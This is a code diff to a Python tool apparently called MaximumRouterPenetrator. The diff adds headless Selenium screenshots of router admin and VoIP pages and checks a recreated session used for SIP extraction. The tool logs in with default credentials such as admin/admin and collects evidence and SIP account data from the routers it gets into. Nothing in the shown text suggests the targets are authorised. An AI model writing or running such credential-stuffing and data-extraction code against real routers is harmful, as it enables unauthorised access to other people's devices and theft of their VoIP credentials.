@@ -116,6 +116,14 @@ class MaximumRouterPenetrator:
         # Ensure screenshot mode is always enabled
         self.screenshot_mode = True
         
+        # Selenium configuration for advanced screenshots
+        self.selenium_config = {
+            'enabled': True,
+            'headless': True,
+            'timeout': 30,
+            'wait_time': 5
+        }
+        
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -1075,35 +1083,54 @@ class MaximumRouterPenetrator:
                         print(f"   • Capturing VoIP page evidence")
                         print(f"         📸 LIVE DEBUG: Taking admin panel screenshot...")
                     
-                    # Use urllib for screenshot if no session available
-                    if auth_result.get('session'):
-                        screenshot_result = self._take_screenshot(
-                            auth_result['session'], 
-                            f"http://{target_ip}/admin/", 
-                            f"admin_panel_{target_ip}.png",
-                            verbose
-                        )
-                    else:
-                        # Create screenshot using urllib
-                        screenshot_result = self._take_screenshot_urllib(
-                            target_ip, 
-                            f"admin_panel_{target_ip}.png",
-                            auth_result.get('credentials', ('admin', 'admin')),
-                            verbose
-                        )
+                    # Try Selenium first, then fallback to urllib
+                    screenshot_result = self._take_selenium_screenshot(
+                        target_ip, 
+                        "/admin/", 
+                        f"admin_panel_{target_ip}.png",
+                        auth_result.get('credentials', ('admin', 'admin')),
+                        verbose
+                    )
+                    
+                    # Fallback to urllib if Selenium fails
+                    if not screenshot_result['success']:
+                        if auth_result.get('session'):
+                            screenshot_result = self._take_screenshot(
+                                auth_result['session'], 
+                                f"http://{target_ip}/admin/", 
+                                f"admin_panel_{target_ip}.png",
+                                verbose
+                            )
+                        else:
+                            screenshot_result = self._take_screenshot_urllib(
+                                target_ip, 
+                                f"admin_panel_{target_ip}.png",
+                                auth_result.get('credentials', ('admin', 'admin')),
+                                verbose
+                            )
                     
                     # Take VoIP page screenshot
-                    if screenshot_result['success']:
+                    voip_screenshot = self._take_selenium_screenshot(
+                        target_ip, 
+                        "/voip.html", 
+                        f"voip_page_{target_ip}.png",
+                        auth_result.get('credentials', ('admin', 'admin')),
+                        verbose
+                    )
+                    
+                    # Fallback to urllib for VoIP screenshot
+                    if not voip_screenshot['success']:
                         voip_screenshot = self._take_screenshot_urllib(
                             target_ip, 
                             f"voip_page_{target_ip}.png",
                             auth_result.get('credentials', ('admin', 'admin')),
                             verbose
                         )
-                        if voip_screenshot['success']:
-                            result['voip_screenshot'] = voip_screenshot['filename']
-                            if verbose:
-                                print(f"         ✅ VoIP page screenshot saved: {voip_screenshot['filename']}")
+                    
+                    if voip_screenshot['success']:
+                        result['voip_screenshot'] = voip_screenshot['filename']
+                        if verbose:
+                            print(f"         ✅ VoIP page screenshot saved: {voip_screenshot['filename']}")
                     
                     if screenshot_result['success']:
                         result['admin_screenshot'] = screenshot_result['filename']
@@ -1153,9 +1180,15 @@ class MaximumRouterPenetrator:
                         session = requests.Session()
                         session.auth = (auth_result['credentials'][0], auth_result['credentials'][1])
                         session.verify = False
-                        auth_result['session'] = session
-                        if verbose:
-                            print(f"         ✅ LIVE DEBUG: Session recreated for SIP extraction")
+                        # Test session with a simple request
+                        test_response = session.get(f"http://{target_ip}/admin/", timeout=10)
+                        if test_response.status_code == 200:
+                            auth_result['session'] = session
+                            if verbose:
+                                print(f"         ✅ LIVE DEBUG: Session recreated and tested for SIP extraction")
+                        else:
+                            if verbose:
+                                print(f"         ❌ LIVE DEBUG: Session test failed: {test_response.status_code}")
                 except Exception as e:
                     if verbose:
                         print(f"         ❌ LIVE DEBUG: Session recreation failed: {str(e)[:50]}")
@@ -3668,6 +3701,76 @@ class MaximumRouterPenetrator:
                 print(f"         ❌ Admin panel SIP extraction error: {str(e)[:50]}")
         
         return sip_result
+    
+    def _take_selenium_screenshot(self, ip: str, url: str, filename: str, credentials: tuple, verbose: bool) -> Dict[str, Any]:
+        """Take screenshot using Selenium WebDriver"""
+        result = {'success': False, 'filename': None, 'error': None}
+        
+        try:
+            # Check if Selenium is available
+            try:
+                from selenium import webdriver
+                from selenium.webdriver.common.by import By
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                from selenium.webdriver.chrome.options import Options
+                from selenium.webdriver.common.auth import HTTPBasicAuth
+                from selenium.webdriver.support.ui import Select
+            except ImportError:
+                if verbose:
+                    print(f"         ❌ Selenium not available, falling back to urllib")
+                return result
+            
+            # Configure Chrome options
+            chrome_options = Options()
+            if self.selenium_config['headless']:
+                chrome_options.add_argument('--headless')
+            chrome_options.add_argument('--no-sandbox')
+            chrome_options.add_argument('--disable-dev-shm-usage')
+            chrome_options.add_argument('--disable-gpu')
+            chrome_options.add_argument('--window-size=1920,1080')
+            
+            # Create WebDriver
+            driver = webdriver.Chrome(options=chrome_options)
+            driver.set_page_load_timeout(self.selenium_config['timeout'])
+            
+            try:
+                # Navigate to URL with authentication
+                if credentials:
+                    # For Basic Auth, we need to include credentials in URL
+                    auth_url = f"http://{credentials[0]}:{credentials[1]}@{ip}{url}"
+                else:
+                    auth_url = f"http://{ip}{url}"
+                
+                if verbose:
+                    print(f"         🔍 LIVE DEBUG: Selenium navigating to: {auth_url}")
+                
+                driver.get(auth_url)
+                
+                # Wait for page to load
+                WebDriverWait(driver, self.selenium_config['wait_time']).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "body"))
+                )
+                
+                # Take screenshot
+                screenshot_path = f"screenshots/{filename}"
+                driver.save_screenshot(screenshot_path)
+                
+                result['success'] = True
+                result['filename'] = screenshot_path
+                
+                if verbose:
+                    print(f"         ✅ Selenium screenshot saved: {screenshot_path}")
+                
+            finally:
+                driver.quit()
+                
+        except Exception as e:
+            result['error'] = str(e)
+            if verbose:
+                print(f"         ❌ Selenium screenshot error: {str(e)[:50]}")
+        
+        return result
     
     def _extract_sip_from_admin_panel_urllib(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
         """Extract SIP data from admin panel pages using urllib"""
